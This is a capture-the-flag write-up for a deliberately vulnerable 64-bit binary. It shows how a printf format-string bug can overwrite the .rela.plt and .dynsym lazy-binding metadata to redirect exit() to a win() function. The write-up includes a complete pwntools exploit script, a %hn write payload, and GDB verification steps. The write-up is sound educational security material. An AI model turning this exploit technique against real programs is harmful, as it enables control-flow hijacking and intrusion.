# Talking Mirror — Detailed Writeup (Format String + Lazy Binding Hijack)

> **Goal:** trigger the provided `win()` function to print `flag.txt`  
> **Binary:** 64-bit ELF, dynamically linked, **NX enabled**, **No PIE**, **Partial RELRO**, **No stack canary**  
> **Key twist:** input is read with `fgets()`, so **newline byte `0x0a` inside the payload truncates your input**.

This writeup is intentionally **very explicit**, and includes:
- the concepts you asked about (PT_LOAD, VirtAddr, `.interp`, `.gnu.hash`, `.dynsym`, `.rela.plt`, relocation types…)
- why the “obvious” GOT overwrite fails
- how the intended technique works (redirect **lazy binding** to `win()`)
- commands to reproduce everything (static + pwndbg/GDB verification)
- a working exploit script

---

## 0) TL;DR Exploit Idea (High Level)

1. The program does `printf(buf)` → **format string vulnerability**.
2. The program then does `exit(0)` → a perfect **trigger**.
3. Normally you overwrite `exit@GOT` to point to `win()`.
4. But `.got.plt` addresses are `0x400a**` and contain the byte `0x0a` (newline), so `fgets()` truncates your payload → **cannot inject `.got.plt` pointers**.
5. Instead: overwrite **metadata** used by the dynamic linker for **lazy binding**:
   - patch the `exit` relocation entry in `.rela.plt` so the resolver resolves `stdout` instead of `exit`
   - patch `dynsym[stdout].st_value` so “stdout resolves to win”
6. When `exit@plt` resolves lazily, it will jump to `win()`.

---

## 1) Phase 0 — Recon & Setup

### 1.1 Files
```bash
ls -lah
file challenge
sha256sum challenge
```

You saw:
- ELF 64-bit, dynamically linked, **not stripped**.

### 1.2 Protections
```bash
checksec --file=challenge
```
You got:
- **RELRO: Partial**
- **Canary: none**
- **NX: enabled**
- **PIE: no**

**Interpretation:**
- **No PIE**: `.text` addresses like `win=0x401216` are fixed (good).
- **NX enabled**: stack is not executable; you use **control-flow hijack / ROP / function redirection**, not shellcode.
- **Partial RELRO**: `.got` is often protected, but **`.got.plt` typically remains writable** (normally great for GOT overwrite).
- **No canary**: stack smashing is easier (not used here because bug is format string, not overflow).

### 1.3 Quick win checks
```bash
nm -n ./challenge | grep -iE " win$| flag$| shell$| backdoor$| secret$" || true
strings -n 5 ./challenge | grep -iE "/bin/sh|cat flag|flag\.txt" || true
```

You found:
- `win` exists at `0x401216`
- `flag.txt` string exists

✅ This screams “ret2win / call win”.

---

## 2) Phase 1 — Static Analysis (Understand the Program)

### 2.1 Disassembly / Decompile Key Functions

Your `objdump` already revealed:

#### `win()` at `0x401216`
It prints “Congratulations”, opens `flag.txt`, reads it, prints it, then `_exit(0)`.

#### `vuln()` at `0x4012a3`
Key lines:
- reads a line with `fgets(buf, 0x64, stdin)`
- calls `printf(buf)`  ✅ **format string vulnerability**
- calls `exit(0)`       ✅ **trigger point**

#### `main()`
Calls `vuln()` once and ends.

---

## 3) Confirm the Bug (Format String) and Find Stack Offset

### 3.1 Confirm format string works
You ran:
```bash
python3 - << 'PY' | ./challenge
print("AAAABBBB." + ".%p"*30)
PY
```

You saw output containing:
- `0x4242424241414141` — that is `BBBBAAAA` in little endian

✅ This proves your input bytes are being treated as `printf` arguments.

### 3.2 Determine the “offset” (which `$N` index is our buffer)
From your dump, `0x4242424241414141` appears at the **6th** `%p`.

So:
- `buf+0x00` corresponds to argument **6** (`%6$p`)
- `buf+0x08` corresponds to argument **7**
- etc.

This is critical later for **positional writes** like `%14$hn`.

---

## 4) Why the “Obvious” Exploit Fails (GOT overwrite blocked by `fgets`)

### 4.1 The normal plan
Overwrite `exit@GOT` → `win`:
- target: `exit@GOT = 0x400a50`
- desired value: `win = 0x401216`

### 4.2 The twist: `fgets()` stops at newline byte `0x0a`
`fgets` reads until it sees `\n` (byte `0x0a`) **in the input stream**.

Now look at the bytes of `exit@GOT`:
```bash
python3 - <<'PY'
from pwn import *
print(enhex(p64(0x400a50)))
PY
```

`0x400a50` as little-endian bytes:
```
50 0a 40 00 00 00 00 00
     ^^
     newline byte
```

✅ If you try to append `p64(0x400a50)` into your input (as `fmtstr_payload` does), the byte `0x0a` will appear **inside** the line, and `fgets` will stop reading right there.  
So your payload gets truncated, and the appended addresses never arrive intact.

> **Important clarification:** This is NOT mainly about null bytes (`0x00`).  
> `fgets` does **not** stop at `0x00`. It stops at **newline** (`0x0a`).

---

## 5) ELF Program Headers (What you asked about: PT_LOAD, VirtAddr, `.interp`, etc.)

You asked:
- “What is PT_LOAD?”
- “What is VirtAddr?”
- “Why MemSiz > FileSiz implies .bss?”
- “What is `.interp`?”
- “How do we know which segment contains which section?”

### 5.1 VirtAddr
**VirtAddr** is the **virtual memory address** where the loader maps that segment in the process.

- Because this binary is **EXEC (No PIE)**, VirtAddr is essentially the **actual runtime address**.
- If PIE was enabled, the loader would add a random base.

### 5.2 PT_LOAD
A `PT_LOAD` segment means:
> “Map this range of the file into memory at VirtAddr with these permissions.”

These are the memory regions you see in `/proc/<pid>/maps` / `vmmap`.

### 5.3 Why `MemSiz > FileSiz` implies zero-filled (`.bss`)
The loader reads `FileSiz` bytes from the file, but must allocate `MemSiz` bytes in memory.

If `MemSiz > FileSiz`, the extra bytes do not exist in the file, so the loader creates them and **zeros them**.
That is how `.bss` (zero-initialized globals) works.

### 5.4 `.interp`
`.interp` contains the interpreter path:
`/lib64/ld-linux-x86-64.so.2`

That is the dynamic loader that loads libc and resolves symbols.

### 5.5 Section-to-Segment mapping
`readelf -l` prints “Section to Segment mapping”, which literally tells you:
> which **sections** lie inside which **segments**.

In your output:
- Segment 02 (RW) contains `.dynsym` and `.rela.plt` ✅ important
- Segment 03 (RX) contains `.text` ✅ where `win` lives
- Segment 05 is covered by GNU_RELRO ✅ more protected metadata region

---

## 6) The Real Trick — Hijack Lazy Binding (No GOT pointer injection)

### 6.1 Concepts (you asked these)
- **Relocation entries**: dynamic linker “to-do list” for patching addresses at runtime.
- **`.rela.plt`**: relocation table for PLT/GOT function calls (lazy binding).
- **`.dynsym`**: dynamic symbol table (symbols that can be resolved by the linker).
- **Relocation type**: how to apply the relocation (for PLT it’s typically `JUMP_SLOT`).

### 6.2 Why does `exit@plt` ever call `_dl_fixup`?
PLT stubs do:
- jump through the GOT slot
- **if GOT slot isn’t resolved yet**, it routes to PLT0 which invokes the dynamic linker resolver (`_dl_runtime_resolve`, which calls `_dl_fixup` internally)
- resolver finds the symbol, patches GOT, and returns the resolved address

**After the first resolve**, calls go directly through the now-patched GOT slot.

### 6.3 The data structures involved

#### `.rela.plt` entries are `Elf64_Rela` (24 bytes each)
```c
typedef struct {
  uint64_t r_offset;  // where to write the resolved address (usually a GOT slot)
  uint64_t r_info;    // packs: (symbol_index << 32) | relocation_type
  int64_t  r_addend;  // usually 0 for PLT
} Elf64_Rela;
```

- `r_offset`: “where to patch” (GOT entry)
- `r_info`: contains:
  - high 32 bits: **symbol index** into `.dynsym`
  - low 32 bits: relocation type (e.g., `R_X86_64_JUMP_SLOT`)
- `r_addend`: typically 0 here

### 6.4 What is `.gnu.hash` and why `stdout`?
`.gnu.hash` is a hash table used by the dynamic linker to locate symbols quickly inside an object.
It has a field **`symoffset`**, which effectively means: dynsym entries with index `< symoffset` are not part of the hash lookup set.

In this challenge, `symoffset = 11` (as stated in the writeup), so dynsym index **11** (stdout) is one of the few symbols the linker can find “inside the executable”.

So the exploit redirects resolution to **stdout**.

---

## 7) Concrete Patch Plan (What exactly we write)

Everything we modify is in the **first RW PT_LOAD segment** (addresses around `0x4003xx–0x4006xx`) — importantly, these addresses **do not contain `0x0a` bytes** in their little-endian representation, so `fgets` won’t truncate our payload.

### Patch A — Change exit relocation’s symbol index: 10 → 11
Writeup constants:
- `.rela.plt` base: `0x400638`
- exit entry is the 8th (index 7): `0x400638 + 7*24 = 0x4006e0`
- `r_info` is at `0x4006e8`
- the **symbol index** is stored in the high 32 bits of `r_info`, so the **LSB of the high dword** is at `r_info + 4`:
  - `0x4006e8 + 4 = 0x4006ec`

✅ Write byte `0x0b` to `0x4006ec`.

### Patch B — Make dynsym[11] resolve to `win`
Writeup constants:
- `.dynsym` base: `0x4003d8`
- entry size: 24
- dynsym[11] starts at: `0x4003d8 + 11*24 = 0x4004e0`
- `st_value` field is at +8:
  - `0x4004e0 + 8 = 0x4004e8`

We want `st_value = 0x401216`.
We can do it with two `%hn` (16-bit writes):
- write `0x0040` to `0x4004ea` (high 16 bits of low 32)
- write `0x1216` to `0x4004e8` (low 16 bits)

---

## 8) How We “Write Those Tables” Using the Format String

We use `printf(buf)` vulnerability with `%n`-style specifiers.

- `%hhn` writes **1 byte**
- `%hn` writes **2 bytes**
- `%n` writes **4/8 bytes** depending on ABI

Key rule:
> `%hn` writes the number of characters printed so far (mod 65536) to the target address.

### 8.1 How do we supply target addresses to `%hn/%hhn`?
We place raw pointers at the end of our input buffer and reference them using positional parameters like `%14$hn`.

We already measured:
- `buf` appears at `%6$...`.

If we want our first pointer at `buf + 0x40`, then:
- argument index = `6 + (0x40/8) = 14`

So:
- `%14$...` refers to the pointer stored at `buf+0x40`
- `%15$...` → `buf+0x48`
- `%16$...` → `buf+0x50`

---

## 9) Working Exploit Script

Save as `solve.py`:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./challenge", checksec=False)
context.log_level = "info"

RELA_EXIT_SYMIDX_LSB = 0x4006ec      # write 0x0b here (symbol index 11 = stdout)
DYNSYM11_ST_VALUE    = 0x4004e8      # write 0x1216 here (low 16)
DYNSYM11_ST_VALUE_HI = 0x4004ea      # write 0x0040 here (next 16)

def start():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process(elf.path)

def assert_no_newline(addr):
    b = p64(addr)
    assert b"\x0a" not in b, f"address {hex(addr)} contains newline byte: {b.hex()}"

for a in [RELA_EXIT_SYMIDX_LSB, DYNSYM11_ST_VALUE, DYNSYM11_ST_VALUE_HI]:
    assert_no_newline(a)

io = start()
io.recvline()  # banner

# Write plan:
# total printed = 11      -> %14$hhn writes 0x0b
# total printed = 64      -> %15$hn  writes 0x0040
# total printed = 0x1216  -> %16$hn  writes 0x1216
fmt  = b"%1$11c%14$hhn%1$53c%15$hn%1$4566c%16$hn"
fmt  = fmt.ljust(0x40, b"A")  # place pointers at buf+0x40

payload = (
    fmt +
    p64(RELA_EXIT_SYMIDX_LSB) +
    p64(DYNSYM11_ST_VALUE_HI) +
    p64(DYNSYM11_ST_VALUE)
)

assert len(payload) < 0x64, "payload too long for fgets(0x64)"
io.sendline(payload)
print(io.recvall(timeout=2).decode(errors="ignore"))
```

---

## 10) Static Verification Commands (Re-derive Addresses)

```bash
readelf -S ./challenge | egrep '\.dynsym|\.rela\.plt|\.gnu\.hash|\.got\.plt|\.got|\.text'
readelf -r ./challenge | grep -n ' exit@'
readelf -s --dyn-syms ./challenge | egrep ' exit$| stdout$'
```

---

## 11) Dynamic Analysis (pwndbg/GDB) — Confirm the Patches in Memory

Start:
```bash
gdb ./challenge
```

Breakpoints:
```gdb
b *0x4012e2   # call printf@plt
b *0x4012ec   # call exit@plt
run
```

After sending payload, inspect:

**Patch A**
```gdb
x/4bx 0x4006ec
```

**Patch B**
```gdb
x/2hx 0x4004e8
x/gx  0x4004e8
```

Useful:
```gdb
vmmap
info proc mappings
x/40gx $rsp
```

---

## 12) “Where is exit? I don’t see it.”
- `exit()` is in **libc**
- your binary has `exit@plt` (stub) + `exit@got` (pointer slot)

Confirm:
```bash
objdump -d -M intel ./challenge | grep -n "<exit@plt>"
objdump -R ./challenge | grep " exit@"
```

---

## 13) Lessons Learned

- Input constraints matter: `fgets` + newline bytes can kill classic format-string patterns.
- When direct GOT writes are blocked, hunt for **other writable linker metadata**.
- Lazy binding is weaponizable if `.rela.plt` / `.dynsym` are writable.
- Verify everything in GDB: your patches should show in memory.

---

**End.**
